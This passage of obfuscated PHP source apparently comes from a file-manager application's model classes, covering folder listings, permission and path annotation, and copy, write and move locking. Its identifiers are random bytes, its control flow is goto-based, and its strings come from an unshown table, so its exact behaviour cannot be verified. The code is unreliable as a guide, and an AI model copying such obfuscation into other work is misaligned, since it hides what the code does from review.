array($a¿…ãÕ¤­Ê[461] => $aÜ¬ÃÀéÛ[$a¿…ãÕ¤­Ê[462]], $a¿…ãÕ¤­Ê[463] => $aÜ¬ÃÀéÛ[$a¿…ãÕ¤­Ê[464]], $a¿…ãÕ¤­Ê[465] => $aÜ¬ÃÀéÛ[$a¿…ãÕ¤­Ê[390]], $a¿…ãÕ¤­Ê[466] => $aÜ¬ÃÀéÛ[$a¿…ãÕ¤­Ê[467]], $a¿…ãÕ¤­Ê[468] => $aÜ¬ÃÀéÛ[$a¿…ãÕ¤­Ê[469]], $a¿…ãÕ¤­Ê[470] => $aÜ¬ÃÀéÛ[$a¿…ãÕ¤­Ê[470]], $a¿…ãÕ¤­Ê[471] => $aÜ¬ÃÀéÛ[$a¿…ãÕ¤­Ê[471]]); } } } unset($aîŒøùšš¥); goto CäŒê‘è…®; e˜†ˆœğƒò: } protected function _listAppendChildren(&$CàÏ¥…ˆ…È, $d–¼Úï¢®) { goto CÒ¹½²Š—Ä; EîœÆÀ‹œ: $EİÈïÍ½Ò± = array(); foreach ($E„³±½ŠŞî as $cˆ‰áã¨ç˜) { $cËù‹´Ë¥‹ = $cˆ‰áã¨ç˜[$F£˜‰¹ÚÇÊ[472]]; $Cáç¯ÜğË© = $cˆ‰áã¨ç˜[$F£˜‰¹ÚÇÊ[397]] == $F£˜‰¹ÚÇÊ[86] ? $F£˜‰¹ÚÇÊ[202] : $F£˜‰¹ÚÇÊ[201]; if (!isset($EİÈïÍ½Ò±[$cËù‹´Ë¥‹])) { $EİÈïÍ½Ò±[$cËù‹´Ë¥‹] = array($F£˜‰¹ÚÇÊ[201] => 0, $F£˜‰¹ÚÇÊ[202] => 0); } $EİÈïÍ½Ò±[$cËù‹´Ë¥‹][$Cáç¯ÜğË©] += $cˆ‰áã¨ç˜[$F£˜‰¹ÚÇÊ[474]]; } foreach ($CàÏ¥…ˆ…È as &$AöÅßĞ…š­) { if (!$AöÅßĞ…š­[$F£˜‰¹ÚÇÊ[397]]) { continue; } $dÕ˜æ”×“ë = is_array($EİÈïÍ½Ò±[$AöÅßĞ…š­[$F£˜‰¹ÚÇÊ[390]]]) ? $EİÈïÍ½Ò±[$AöÅßĞ…š­[$F£˜‰¹ÚÇÊ[390]]] : $d¶È‡ëÛÑ; $AöÅßĞ…š­[$F£˜‰¹ÚÇÊ[202]] = $dÕ˜æ”×“ë[$F£˜‰¹ÚÇÊ[202]]; $AöÅßĞ…š­[$F£˜‰¹ÚÇÊ[201]] = $dÕ˜æ”×“ë[$F£˜‰¹ÚÇÊ[201]]; unset($AöÅßĞ…š­[$F£˜‰¹ÚÇÊ[399]]); } goto Cè Ÿ‰“Æ; Cè Ÿ‰“Æ: unset($AöÅßĞ…š­); goto b‘ŸŠ·ˆù; b£„Ì®÷š¾: foreach ($CàÏ¥…ˆ…È as &$AöÅßĞ…š­) { if (!$AöÅßĞ…š­[$F£˜‰¹ÚÇÊ[397]]) { continue; } $f¢ÒƒÎò¹¾[] = $AöÅßĞ…š­[$F£˜‰¹ÚÇÊ[390]]; } unset($AöÅßĞ…š­); if (!$f¢ÒƒÎò¹¾) { return; } goto Cˆ™Şª–Ï; CÒ¹½²Š—Ä: $F£˜‰¹ÚÇÊ =& $_SERVER[ç]; $f¢ÒƒÎò¹¾ = array(); $d¶È‡ëÛÑ = array($F£˜‰¹ÚÇÊ[201] => 0, $F£˜‰¹ÚÇÊ[202] => 0); goto b£„Ì®÷š¾; Cˆ™Şª–Ï: $a™ Ñ ²ªÓ = array($F£˜‰¹ÚÇÊ[472] => array($F£˜‰¹ÚÇÊ[7], $f¢ÒƒÎò¹¾)); $eªÙ£ÏòŸÕ = array($F£˜‰¹ÚÇÊ[472], $F£˜‰¹ÚÇÊ[397], $F£˜‰¹ÚÇÊ[473] => $F£˜‰¹ÚÇÊ[474]); $E„³±½ŠŞî = $this->field($eªÙ£ÏòŸÕ)->where($a™ Ñ ²ªÓ)->group($F£˜‰¹ÚÇÊ[475])->select(); goto EîœÆÀ‹œ; b‘ŸŠ·ˆù: } protected function _listAppendAuth(&$fˆªãäóÁã) { goto C ö–ÄåóÕ; C ö–ÄåóÕ: $d†¡¾ÏÏ =& $_SERVER[ç]; if (!defined($d†¡¾ÏÏ[448])) { return; } $A°ø¾¥ÓÏ‡ = array(); goto C¤‰×½ªõä; F©†Œ…’ÛÛ: $DêÅ„òöô = Model($d†¡¾ÏÏ[476])->getSourceList($A°ø¾¥ÓÏ‡, $f²²ŸƒàïÒ); foreach ($fˆªãäóÁã as $a¨•‚ÙÓàâ => &$aîŒ”†èâ¶) { $aîŒ”†èâ¶[$d†¡¾ÏÏ[400]] = $DêÅ„òöô[$aîŒ”†èâ¶[$d†¡¾ÏÏ[390]]]; if (!$aîŒ”†èâ¶[$d†¡¾ÏÏ[400]] && $aîŒ”†èâ¶[$d†¡¾ÏÏ[398]] == self::TYPE_GROUP) { $aîŒ”†èâ¶[$d†¡¾ÏÏ[400]] = Action($d†¡¾ÏÏ[477])->pathGroupAuthMake($aîŒ”†èâ¶[$d†¡¾ÏÏ[478]]); if (!$aîŒ”†èâ¶[$d†¡¾ÏÏ[400]] && !_get($GLOBALS, $d†¡¾ÏÏ[479])) { $aîŒ”†èâ¶[$d†¡¾ÏÏ[194]] = !1; $aîŒ”†èâ¶[$d†¡¾ÏÏ[193]] = !1; } } if ($aîŒ”†èâ¶[$d†¡¾ÏÏ[400]]) { $aîŒ”†èâ¶[$d†¡¾ÏÏ[194]] = AuthModel::authCheckEdit($aîŒ”†èâ¶[$d†¡¾ÏÏ[400]][$d†¡¾ÏÏ[401]]); $aîŒ”†èâ¶[$d†¡¾ÏÏ[193]] = AuthModel::authCheckView($aîŒ”†èâ¶[$d†¡¾ÏÏ[400]][$d†¡¾ÏÏ[401]]); } $this->groupPathDisplay($aîŒ”†èâ¶); } unset($aîŒ”†èâ¶); goto AË«®ëÖ¶©; C¤‰×½ªõä: foreach ($fˆªãäóÁã as $aîŒ”†èâ¶) { if ($aîŒ”†èâ¶[$d†¡¾ÏÏ[398]] == self::TYPE_GROUP) { $A°ø¾¥ÓÏ‡[] = $aîŒ”†èâ¶[$d†¡¾ÏÏ[390]]; } } if (!$A°ø¾¥ÓÏ‡) { return; } $f²²ŸƒàïÒ = array_to_keyvalue($fˆªãäóÁã, $d†¡¾ÏÏ[390]); goto F©†Œ…’ÛÛ; AË«®ëÖ¶©: } public function groupPathDisplay(&$dƒá÷ôÈÉæ) { goto e‡øÇ­ó‡Ë; dÁš¬‰å¼: $dƒá÷ôÈÉæ[$eÓÏ†ºªÆä[486]] = $bœ‹ÉÇ®ÔÇ . $fóíœ–[$eÓÏ†ºªÆä[84]][$eÓÏ†ºªÆä[390]]; goto E‰‰ÙåÃš¸; f¡À¥©æ‹Ø: $Fº•á¡æ÷š = $this->parentLevelArray($fóíœ–[$eÓÏ†ºªÆä[481]]); $bœ‹ÉÇ®ÔÇ = $eÓÏ†ºªÆä[33]; foreach ($Fº•á¡æ÷š as $f²Ûßê¶¨Ú) { $fƒ´¨İ‡ö¢ = Model($eÓÏ†ºªÆä[480])->getInfo($f²Ûßê¶¨Ú); $bœ‹ÉÇ®ÔÇ .= $fƒ´¨İ‡ö¢[$eÓÏ†ºªÆä[84]][$eÓÏ†ºªÆä[390]] . $eÓÏ†ºªÆä[47]; } goto fŞÈ÷ƒÀ…Œ; fŞÈ÷ƒÀ…Œ: $dƒá÷ôÈÉæ[$eÓÏ†ºªÆä[482]] = $fóíœ–[$eÓÏ†ºªÆä[472]]; $dƒá÷ôÈÉæ[$eÓÏ†ºªÆä[483]] = $fóíœ–[$eÓÏ†ºªÆä[481]]; $dƒá÷ôÈÉæ[$eÓÏ†ºªÆä[484]] = $fóíœ–[$eÓÏ†ºªÆä[485]]; goto dÁš¬‰å¼; e‡øÇ­ó‡Ë: $eÓÏ†ºªÆä =& $_SERVER[ç]; if ($dƒá÷ôÈÉæ[$eÓÏ†ºªÆä[398]] != self::TYPE_GROUP) { return; } $fóíœ– = Model($eÓÏ†ºªÆä[480])->getInfo($dƒá÷ôÈÉæ[$eÓÏ†ºªÆä[478]]); goto f¡À¥©æ‹Ø; E‰‰ÙåÃš¸: } protected function _listAppendPath(&$Cé¶Ùò³µ°) { goto c•»›É®ïŞ; FÊÒÈòñˆ: $BƒÌÏ“„æŞ = array(); foreach ($Cé¶Ùò³µ° as &$b‰µÆÛ¹Ì) { $A¼„¦¿š¤Ğ = $b‰µÆÛ¹Ì[$d‚×¹„Ã¬¦[397]] == $d‚×¹„Ã¬¦[86]; if ($A¼„¦¿š¤Ğ) { $AÎ·™÷‚–Ô[$b‰µÆÛ¹Ì[$d‚×¹„Ã¬¦[390]]] = $b‰µÆÛ¹Ì[$d‚×¹„Ã¬¦[28]]; } if (isset($BƒÌÏ“„æŞ[$b‰µÆÛ¹Ì[$d‚×¹„Ã¬¦[481]]])) { continue; } $BƒÌÏ“„æŞ[$b‰µÆÛ¹Ì[$d‚×¹„Ã¬¦[481]]] = !0; $CŠ„¢¹¼¬ = $this->parentLevelArray($b‰µÆÛ¹Ì[$d‚×¹„Ã¬¦[481]]); foreach ($CŠ„¢¹¼¬ as $Dõ¯„É§¨ => $E¼ÒÏß¿Ëƒ) { if ($Dõ¯„É§¨ != 0 && !isset($AÎ·™÷‚–Ô[$E¼ÒÏß¿Ëƒ])) { $Fµô”–³¢[] = $E¼ÒÏß¿Ëƒ; } } } unset($b‰µÆÛ¹Ì); goto b¿­šÆ§´Á; eÊ£¨„©‘Ä: $fÒƒİ²«Šª = array(); $E©…ÓÍÄá’ = array(); foreach ($Cé¶Ùò³µ° as &$b‰µÆÛ¹Ì) { goto dÇöÛĞ‡¨; dÇöÛĞ‡¨: $aã¨æÂºº = $b‰µÆÛ¹Ì[$d‚×¹„Ã¬¦[481]]; if (isset($E©…ÓÍÄá’[$aã¨æÂºº])) { $Eš¤Çñê’ = $fÒƒİ²«Šª[$aã¨æÂºº]; } else { $CŠ„¢¹¼¬ = $this->parentLevelArray($b‰µÆÛ¹Ì[$d‚×¹„Ã¬¦[481]]); $dºĞ¿ÄÒ»” = $d‚×¹„Ã¬¦[488] . $b‰µÆÛ¹Ì[$d‚×¹„Ã¬¦[398]] . $d‚×¹„Ã¬¦[434] . $b‰µÆÛ¹Ì[$d‚×¹„Ã¬¦[478]]; if ($fÒƒİ²«Šª[$dºĞ¿ÄÒ»”]) { $Eš¤Çñê’ = $fÒƒİ²«Šª[$dºĞ¿ÄÒ»”]; } else { $Eš¤Çñê’ = $this->_listAppendPathRoot($b‰µÆÛ¹Ì, $CŠ„¢¹¼¬); $fÒƒİ²«Šª[$dºĞ¿ÄÒ»”] = $Eš¤Çñê’; } foreach ($CŠ„¢¹¼¬ as $Dõ¯„É§¨ => $E¼ÒÏß¿Ëƒ) { if ($Dõ¯„É§¨ == 0 && $Eš¤Çñê’ && $b‰µÆÛ¹Ì[$d‚×¹„Ã¬¦[398]] == self::TYPE_GROUP) { continue; } if (isset($AÎ·™÷‚–Ô[$E¼ÒÏß¿Ëƒ])) { $Eš¤Çñê’ .= $AÎ·™÷‚–Ô[$E¼ÒÏß¿Ëƒ] . $d‚×¹„Ã¬¦[8]; } } if ($CŠ„¢¹¼¬) { $Eš¤Çñê’ .= $b‰µÆÛ¹Ì[$d‚×¹„Ã¬¦[28]]; } $fÒƒİ²«Šª[$aã¨æÂºº] = $Eš¤Çñê’; } if ($b‰µÆÛ¹Ì[$d‚×¹„Ã¬¦[397]]) { $Eš¤Çñê’ .= $d‚×¹„Ã¬¦[8]; } goto d‚œ‘¨â; d‚œ‘¨â: $b‰µÆÛ¹Ì[$d‚×¹„Ã¬¦[489]] = str_replace($d‚×¹„Ã¬¦[490], $d‚×¹„Ã¬¦[8], $Eš¤Çñê’); $c“°óì•¿ê = trim($b‰µÆÛ¹Ì[$d‚×¹„Ã¬¦[489]], $d‚×¹„Ã¬¦[8]); if ($b‰µÆÛ¹Ì[$d‚×¹„Ã¬¦[472]] == $d‚×¹„Ã¬¦[491] && $c“°óì•¿ê) { $b‰µÆÛ¹Ì[$d‚×¹„Ã¬¦[28]] = $c“°óì•¿ê; } goto d•´óŠàë; d•´óŠàë: if (intval($b‰µÆÛ¹Ì[$d‚×¹„Ã¬¦[398]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($b‰µÆÛ¹Ì, $CŠ„¢¹¼¬, $e„…ê‹’ŠÎ); } goto e¬´Æ¯ô; e¬´Æ¯ô: } goto EäÎ»‰¨Åè; b¿­šÆ§´Á: $Fµô”–³¢ = array_unique($Fµô”–³¢); if (count($Fµô”–³¢) > 0) { $aèŞÌ ôØ¾ = array($d‚×¹„Ã¬¦[404] => array($d‚×¹„Ã¬¦[405], $Fµô”–³¢)); if (count($Fµô”–³¢) == 1) { $Cã¬ôó‹Ï = $this->sourceInfo($Fµô”–³¢[0]); $eİ’…ò‹µñ = is_array($Cã¬ôó‹Ï) ? array($Cã¬ôó‹Ï) : !1; } else { $eİ’…ò‹µñ = $this->field($d‚×¹„Ã¬¦[487])->where($aèŞÌ ôØ¾)->select(); } if (!$eİ’…ò‹µñ) { $eİ’…ò‹µñ = array(); } foreach ($eİ’…ò‹µñ as $Eî’ËùïÕ ) { $AÎ·™÷‚–Ô[$Eî’ËùïÕ [$d‚×¹„Ã¬¦[390]]] = $Eî’ËùïÕ [$d‚×¹„Ã¬¦[28]]; } } $e„…ê‹’ŠÎ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto eÊ£¨„©‘Ä; c•»›É®ïŞ: $d‚×¹„Ã¬¦ =& $_SERVER[ç]; static $AÎ·™÷‚–Ô = array(); $Fµô”–³¢ = array(); goto FÊÒÈòñˆ; EäÎ»‰¨Åè: unset($b‰µÆÛ¹Ì); return $Cé¶Ùò³µ°; goto dèõ¥˜“í„; dèõ¥˜“í„: } private function _listAppendPathRecycle(&$E„§›î™Â, $eŒÑÍöƒ°£, $aÜ½»Æğø) { goto cëÍ—öğ…°; AŞôŠÙ†: $f¾í‹˜¬ö‚ = implode($bå’À‡Â‡[8], array_slice($Dì¹‡–éÉê, 2)); $E„§›î™Â[$bå’À‡Â‡[489]] = $bå’À‡Â‡[8] . LNG($bå’À‡Â‡[492]) . $bå’À‡Â‡[8] . ltrim($f¾í‹˜¬ö‚, $bå’À‡Â‡[8]); $E„§›î™Â[$bå’À‡Â‡[481]] = $bå’À‡Â‡[493] . implode($bå’À‡Â‡[47], array_slice($eŒÑÍöƒ°£, 1)) . $bå’À‡Â‡[47]; goto AŸÄ§Í­¸ã; cëÍ—öğ…°: $bå’À‡Â‡ =& $_SERVER[ç]; if (!in_array($aÜ½»Æğø, $eŒÑÍöƒ°£) && $E„§›î™Â[$bå’À‡Â‡[390]] != $aÜ½»Æğø) { return; } $Dì¹‡–éÉê = explode($bå’À‡Â‡[8], trim($E„§›î™Â[$bå’À‡Â‡[489]], $bå’À‡Â‡[8])); goto AŞôŠÙ†; AŸÄ§Í­¸ã: if ($E„§›î™Â[$bå’À‡Â‡[390]] == $aÜ½»Æğø) { $E„§›î™Â[$bå’À‡Â‡[481]] = $bå’À‡Â‡[493]; $E„§›î™Â[$bå’À‡Â‡[472]] = $bå’À‡Â‡[491]; $E„§›î™Â[$bå’À‡Â‡[28]] = LNG($bå’À‡Â‡[492]); } $E„§›î™Â[$bå’À‡Â‡[494]] = $bå’À‡Â‡[495]; goto eƒ‡Î§İë; eƒ‡Î§İë: } protected function _listAppendPathRoot(&$b‹¦¹âùËÔ, $Dµ»¯»³İÖ) { $D¿ƒ»ö¤á¾ =& $_SERVER[ç]; $dÕÓ„íŸÃ = $D¿ƒ»ö¤á¾[33]; if ($b‹¦¹âùËÔ[$D¿ƒ»ö¤á¾[398]] == self::TYPE_USER) { if (defined($D¿ƒ»ö¤á¾[448]) && $b‹¦¹âùËÔ[$D¿ƒ»ö¤á¾[478]] == USER_ID) { $dÕÓ„íŸÃ = LNG($D¿ƒ»ö¤á¾[496]); if (!$Dµ»¯»³İÖ) { $b‹¦¹âùËÔ[$D¿ƒ»ö¤á¾[28]] = $dÕÓ„íŸÃ; } } else { $AÇõŞç‰—ğ = Model($D¿ƒ»ö¤á¾[497])->getInfoSimple($b‹¦¹âùËÔ[$D¿ƒ»ö¤á¾[478]]); $dÕÓ„íŸÃ = LNG($D¿ƒ»ö¤á¾[498]) . $D¿ƒ»ö¤á¾[159] . $AÇõŞç‰—ğ[$D¿ƒ»ö¤á¾[28]] . $D¿ƒ»ö¤á¾[499]; } } else { if ($b‹¦¹âùËÔ[$D¿ƒ»ö¤á¾[398]] == self::TYPE_GROUP) { $AÇõŞç‰—ğ = Model($D¿ƒ»ö¤á¾[480])->getInfoSimple($b‹¦¹âùËÔ[$D¿ƒ»ö¤á¾[478]]); $dÕÓ„íŸÃ = $AÇõŞç‰—ğ[$D¿ƒ»ö¤á¾[28]]; } else { if ($b‹¦¹âùËÔ[$D¿ƒ»ö¤á¾[398]] == self::TYPE_SYSTEM) { $dÕÓ„íŸÃ = $D¿ƒ»ö¤á¾[500]; } } } $dÕÓ„íŸÃ = $dÕÓ„íŸÃ ? $D¿ƒ»ö¤á¾[8] . $dÕÓ„íŸÃ . $D¿ƒ»ö¤á¾[8] : $D¿ƒ»ö¤á¾[8]; return $dÕÓ„íŸÃ; } protected function _listAppendUser(&$DÆ‚ÔÔ¥ç) { goto B‘öØÑµ»‚; b÷¸ŒÛ¿ä: unset($Aá„½Ü); goto bõ³ÚÁ¬ğ; B‘öØÑµ»‚: $CŸ‰Ù©ĞÊÙ =& $_SERVER[ç]; $FæÇÉÜª´Ä = array_to_keyvalue($DÆ‚ÔÔ¥ç, $CŸ‰Ù©ĞÊÙ[33], $CŸ‰Ù©ĞÊÙ[426]); $c§œµëÌ¤ˆ = array_to_keyvalue($DÆ‚ÔÔ¥ç, $CŸ‰Ù©ĞÊÙ[33], $CŸ‰Ù©ĞÊÙ[428]); goto EÓŸ™œ’¹Í; EÓŸ™œ’¹Í: $A™Šå­¹– = array_merge($FæÇÉÜª´Ä, $c§œµëÌ¤ˆ); $Aê—Ò–Â® = Model($CŸ‰Ù©ĞÊÙ[501])->userListInfo($A™Šå­¹–); foreach ($DÆ‚ÔÔ¥ç as &$Aá„½Ü) { $BÔæƒ‡•òĞ = $Aá„½Ü[$CŸ‰Ù©ĞÊÙ[426]]; $Aá„½Ü[$CŸ‰Ù©ĞÊÙ[426]] = $Aê—Ò–Â®[$BÔæƒ‡•òĞ] ? $Aê—Ò–Â®[$BÔæƒ‡•òĞ] : !1; $BÔæƒ‡•òĞ = $Aá„½Ü[$CŸ‰Ù©ĞÊÙ[428]]; $Aá„½Ü[$CŸ‰Ù©ĞÊÙ[428]] = $Aê—Ò–Â®[$BÔæƒ‡•òĞ] ? $Aê—Ò–Â®[$BÔæƒ‡•òĞ] : !1; if (isset($Aá„½Ü[$CŸ‰Ù©ĞÊÙ[439]]) && $Aá„½Ü[$CŸ‰Ù©ĞÊÙ[439]][$CŸ‰Ù©ĞÊÙ[502]]) { $D—»çœÃÊ = $GLOBALS[$CŸ‰Ù©ĞÊÙ[6]][$CŸ‰Ù©ĞÊÙ[87]][$CŸ‰Ù©ĞÊÙ[503]]; if ($Aá„½Ü[$CŸ‰Ù©ĞÊÙ[439]][$CŸ‰Ù©ĞÊÙ[504]] <= time() - $D—»çœÃÊ) { $this->metaSet($Aá„½Ü[$CŸ‰Ù©ĞÊÙ[390]], $CŸ‰Ù©ĞÊÙ[502], null); $this->metaSet($Aá„½Ü[$CŸ‰Ù©ĞÊÙ[390]], $CŸ‰Ù©ĞÊÙ[504], null); unset($Aá„½Ü[$CŸ‰Ù©ĞÊÙ[439]][$CŸ‰Ù©ĞÊÙ[502]]); continue; } $aÒ®¬Ìñê× = $Aá„½Ü[$CŸ‰Ù©ĞÊÙ[439]][$CŸ‰Ù©ĞÊÙ[502]]; $Aá„½Ü[$CŸ‰Ù©ĞÊÙ[439]][$CŸ‰Ù©ĞÊÙ[505]] = Model($CŸ‰Ù©ĞÊÙ[501])->getInfoSimpleOuter($aÒ®¬Ìñê×); } } goto b÷¸ŒÛ¿ä; bõ³ÚÁ¬ğ: } public function parentLevelArray($d˜§Úš Œ) { $bÓÕ¾Çì¯‰ =& $_SERVER[ç]; $d˜§Úš Œ = explode($bÓÕ¾Çì¯‰[47], trim($d˜§Úš Œ, $bÓÕ¾Çì¯‰[47])); return array_remove_value($d˜§Úš Œ, $bÓÕ¾Çì¯‰[491]); } public function listAll($DæŠã†ÄÁŞ) { goto F–õ»ØÆŠ; B’›õİÏ©Ñ: $E˜¡ˆ‚‹µ£ = array_to_keyvalue($E˜¡ˆ‚‹µ£, $eÛ÷´ä¼ÍŒ[390]); $D™ßÏöß¢… = "\x2f{$d±Û“í·Ş[$eÛ÷´ä¼ÍŒ[28]]}\57"; $D™ßÏöß¢… = $D™ßÏöß¢… == $eÛ÷´ä¼ÍŒ[490] ? $eÛ÷´ä¼ÍŒ[8] : $D™ßÏöß¢…; goto A‡à±…°ê; F–õ»ØÆŠ: $eÛ÷´ä¼ÍŒ =& $_SERVER[ç]; $d±Û“í·Ş = $this->sourceInfo($DæŠã†ÄÁŞ); $c÷ÈÇ²ô± = array($eÛ÷´ä¼ÍŒ[506] => array($eÛ÷´ä¼ÍŒ[507], $d±Û“í·Ş[$eÛ÷´ä¼ÍŒ[481]] . $DæŠã†ÄÁŞ . $eÛ÷´ä¼ÍŒ[508]), $eÛ÷´ä¼ÍŒ[509] => 0); goto B”œÄ·áËˆ; A‡à±…°ê: $b†ªÉ£óÖ = array(); foreach ($E˜¡ˆ‚‹µ£ as $BÀœ×ñÇº => $fËïŞÙ­‘º) { goto A²÷¦¤¾–; A²÷¦¤¾–: $bçœ·®Ò“ = $this->parentLevelArray($fËïŞÙ­‘º[$eÛ÷´ä¼ÍŒ[481]]); array_shift($bçœ·®Ò“); $Bñ¯«‘­Öí = $D™ßÏöß¢…; goto CîíŒÀÁòõ; Eµ§ˆ®”: $Bñ¯«‘­Öí = str_replace($eÛ÷´ä¼ÍŒ[490], $eÛ÷´ä¼ÍŒ[8], $Bñ¯«‘­Öí); $Bñ¯«‘­Öí = str_replace($eÛ÷´ä¼ÍŒ[490], $eÛ÷´ä¼ÍŒ[8], $Bñ¯«‘­Öí); $C»Ø¶èƒ¼– = array($eÛ÷´ä¼ÍŒ[408] => str_replace($eÛ÷´ä¼ÍŒ[490], $eÛ÷´ä¼ÍŒ[8], $Bñ¯«‘­Öí), $eÛ÷´ä¼ÍŒ[512] => intval($fËïŞÙ­‘º[$eÛ÷´ä¼ÍŒ[397]]), $eÛ÷´ä¼ÍŒ[84] => $this->pathInfoFilter($fËïŞÙ­‘º)); goto AÍŒÏÏ½µÚ; CîíŒÀÁòõ: for ($B¦æ¯çÛŒŞ = 0; $B¦æ¯çÛŒŞ < count($bçœ·®Ò“); $B¦æ¯çÛŒŞ++) { $Bñ¯«‘­Öí .= $E˜¡ˆ‚‹µ£[$bçœ·®Ò“[$B¦æ¯çÛŒŞ]][$eÛ÷´ä¼ÍŒ[28]] . $eÛ÷´ä¼ÍŒ[8]; } $Bñ¯«‘­Öí .= $fËïŞÙ­‘º[$eÛ÷´ä¼ÍŒ[28]]; if ($fËïŞÙ­‘º[$eÛ÷´ä¼ÍŒ[397]]) { $Bñ¯«‘­Öí .= $eÛ÷´ä¼ÍŒ[8]; } goto Eµ§ˆ®”; AÍŒÏÏ½µÚ: if (!$fËïŞÙ­‘º[$eÛ÷´ä¼ÍŒ[397]]) { $C»Ø¶èƒ¼–[$eÛ÷´ä¼ÍŒ[441]] = $fËïŞÙ­‘º[$eÛ÷´ä¼ÍŒ[441]]; $C»Ø¶èƒ¼–[$eÛ÷´ä¼ÍŒ[85]] = $fËïŞÙ­‘º[$eÛ÷´ä¼ÍŒ[75]]; } $b†ªÉ£óÖ[] = $C»Ø¶èƒ¼–; goto Aõ‹ëİËÃ; Aõ‹ëİËÃ: } return $b†ªÉ£óÖ; goto e¸À…ÑèÒ¡; AËá¤—ğ÷õ: $this->_listAppendAuth($E˜¡ˆ‚‹µ£); $this->_listAppendUser($E˜¡ˆ‚‹µ£); $this->_listAppendPath($E˜¡ˆ‚‹µ£); goto B’›õİÏ©Ñ; B”œÄ·áËˆ: $c¼íßŒ¦°¹ = $eÛ÷´ä¼ÍŒ[510]; $AÇç­‡Ääˆ = "\114\105\x46\x54\40\112\x4f\x49\x4e\40{$this->tablePrefix}\151\x6f\x5f\146\x69\154\x65\40\x66\151\154\145\x20\157\156\x20\x73\x6f\165\162\143\x65\56\146\151\x6c\x65\x49\104\40\75\x20\146\x69\154\145\x2e\x66\151\x6c\x65\111\x44"; $E˜¡ˆ‚‹µ£ = $this->alias($eÛ÷´ä¼ÍŒ[511])->field($c¼íßŒ¦°¹)->where($c÷ÈÇ²ô±)->join($AÇç­‡Ääˆ)->select(); goto AËá¤—ğ÷õ; e¸À…ÑèÒ¡: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($a¼­÷Î¾”ç) { goto E–ğ§ ¥…; B²¯æßğœê: $this->_lockEvent($a¼­÷Î¾”ç, array($d‘‹îñîİÎ[516], $d‘‹îñîİÎ[517]), $CÓ‰Ü­‹¹); $this->_lockCheckEnd($d‘‹îñîİÎ[513], $a¼­÷Î¾”ç); goto f·‚ÂÍ®Ğ; bÉ°ê£ÈíÏ: $CÓ‰Ü­‹¹ = 1; $this->_lockEvent($a¼­÷Î¾”ç, array($d‘‹îñîİÎ[514], $d‘‹îñîİÎ[515]), $CÓ‰Ü­‹¹); $this->_lockParent($a¼­÷Î¾”ç, array($d‘‹îñîİÎ[515]), $CÓ‰Ü­‹¹); goto B²¯æßğœê; E–ğ§ ¥…: $d‘‹îñîİÎ =& $_SERVER[ç]; if (!$this->allowLock()) { return; } $this->_lockCheck($d‘‹îñîİÎ[513], $a¼­÷Î¾”ç); goto bÉ°ê£ÈíÏ; f·‚ÂÍ®Ğ: } public function lockCopyEnd($cá·—È®«) { $DŒ§Ñ‚ÉêÔ =& $_SERVER[ç]; if (!$this->allowLock()) { return; } $d¾÷ÇˆÃ™ = 0; $this->_lockEvent($cá·—È®«, array($DŒ§Ñ‚ÉêÔ[514], $DŒ§Ñ‚ÉêÔ[515]), $d¾÷ÇˆÃ™); $this->_lockParent($cá·—È®«, array($DŒ§Ñ‚ÉêÔ[515]), $d¾÷ÇˆÃ™); $this->_lockEvent($cá·—È®«, array($DŒ§Ñ‚ÉêÔ[516], $DŒ§Ñ‚ÉêÔ[517]), $d¾÷ÇˆÃ™); } public function lockWriteStart($f´ÌŠ·Ü«¤, $Dì‰“ÂÜ’Ä = '') { goto D··ÍØ£Ø÷; Aå¬ë–ˆÑæ: $C³à˜ñŒ«Æ = 1; $this->_lockKey($AøÆÆêªÁê[518] . $f´ÌŠ·Ü«¤ . $AøÆÆêªÁê[94] . $Dì‰“ÂÜ’Ä, $C³à˜ñŒ«Æ); $this->_lockEvent($f´ÌŠ·Ü«¤, array($AøÆÆêªÁê[513], $AøÆÆêªÁê[515]), $C³à˜ñŒ«Æ); goto aƒ¤ÛÆÅÈ»; aƒ¤ÛÆÅÈ»: $this->_lockParent($f´ÌŠ·Ü«¤, array($AøÆÆêªÁê[513], $AøÆÆêªÁê[515]), $C³à˜ñŒ«Æ); $this->_lockCheckEnd($AøÆÆêªÁê[514], $f´ÌŠ·Ü«¤); goto aŠ„èë±Ô‹; D··ÍØ£Ø÷: $AøÆÆêªÁê =& $_SERVER[ç]; if (!$this->allowLock()) { return; } $this->_lockCheck($AøÆÆêªÁê[514], $f´ÌŠ·Ü«¤); goto Aå¬ë–ˆÑæ; aŠ„èë±Ô‹: } public function lockWriteEnd($A’º«ÚŸ¬», $CÄß–ğ‘²“ = '') { $fÒ½“›ë =& $_SERVER[ç]; if (!$this->allowLock()) { return; } $DØ¢…àí‰ = 0; $this->_lockKey($fÒ½“›ë[518] . $A’º«ÚŸ¬» . $fÒ½“›ë[94] . $CÄß–ğ‘²“, $DØ¢…àí‰); $this->_lockEvent($A’º«ÚŸ¬», array($fÒ½“›ë[513], $fÒ½“›ë[515]), $DØ¢…àí‰); $this->_lockParent($A’º«ÚŸ¬», array($fÒ½“›ë[513], $fÒ½“›ë[515]), $DØ¢…àí‰); } public function lockMoveStart($Bß Õóà‰¨) { goto D‡¹Ôà¢à; e³¼ƒ¨Ú£Æ: $this->_lockParent($Bß Õóà‰¨, array($cÇ¾¡¸Íƒ¾[513], $cÇ¾¡¸Íƒ¾[515]), $CçÆæ¨É•‰); $this->_lockEvent($Bß Õóà‰¨, array($cÇ¾¡¸Íƒ¾[520], $cÇ¾¡¸Íƒ¾[516], $cÇ¾¡¸Íƒ¾[517]), $CçÆæ¨É•‰); $this->_lockCheckEnd($cÇ¾¡¸Íƒ¾[515], $Bß Õóà‰¨); goto fˆ ØÖ±İ¤; D‡¹Ôà¢à: $cÇ¾¡¸Íƒ¾ =& $_SERVER[ç]; if (!$this->allowLock()) { return; } $this->_lockCheck($cÇ¾¡¸Íƒ¾[515], $Bß Õóà‰¨); goto E§®—ì¢‚; E§®—ì¢‚: $CçÆæ¨É•‰ = 1; $this->_lockKey($cÇ¾¡¸Íƒ¾[519] . $Bß Õóà‰¨, $CçÆæ¨É•‰); $this->_lockEvent($Bß Õóà‰¨, array($cÇ¾¡¸Íƒ¾[513], $cÇ¾¡¸Íƒ¾[514]), $CçÆæ¨É•‰); goto e³¼ƒ¨Ú£Æ; fˆ ØÖ±İ¤: } public function lockMoveEnd($E²•¿¨çÇ„) { goto A±Ú‡ÈäÉ; 